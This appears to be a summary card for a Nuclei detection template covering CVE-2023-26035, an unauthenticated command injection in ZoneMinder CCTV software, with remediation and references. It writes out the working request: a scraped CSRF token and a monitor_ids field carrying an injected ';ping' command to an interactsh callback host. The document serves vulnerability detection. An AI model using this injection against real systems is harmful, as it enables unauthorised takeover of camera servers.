---
cve_id: CVE-2023-26035
template_path: nuclei-templates/http/cves/2023/CVE-2023-26035.yaml
affected_product: ZoneMinder
severity: critical
authentication: none
external_callback: true
affected_versions: Versions prior to 1.36.33 and 1.37.33
preconditions: []
poc_classification: rce
---

## Vulnerability
ZoneMinder is a free, open source CCTV software application for Linux supporting IP, USB and Analog cameras. Versions prior to 1.36.33 and 1.37.33 are affected by unauthenticated remote code execution (CVE-2023-26035, CWE-862) due to missing authorization checks on the snapshot creation action. The endpoint expects a monitor ID but accepts an object, allowing attacker-controlled input to reach `shell_exec` via `TriggerOn`.

Unauthenticated attackers can execute arbitrary commands on the server, fully compromising monitored camera systems and recorded footage.

CVSS v3.1: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).  
Remediation: Upgrade to ZoneMinder 1.36.33 or 1.37.33 or later.

## PoC / Detection
Classification: rce

The template first issues a GET request to `/index.php` and extracts the `csrfMagicToken` value via regex (`csrfMagicToken = \"(key:[a-f0-9]{40},\d+)`). It then sends a POST to `/index.php` with form data `view=snapshot&action=create&monitor_ids[0][Id]=;ping+{{interactsh-url}}&__csrf_magic={{csrf_token}}`. Detection succeeds if a DNS interaction is observed on the interactsh server.

## References
- https://www.rapid7.com/db/modules/exploit/unix/webapp/zoneminder_snapshots/
- https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-72rg-h4vf-29gr
- https://packetstormsecurity.com/files/175675/ZoneMinder-Snapshots-Command-Injection.html
- https://github.com/rvizx/CVE-2023-26035
- https://nvd.nist.gov/vuln/detail/CVE-2023-26035
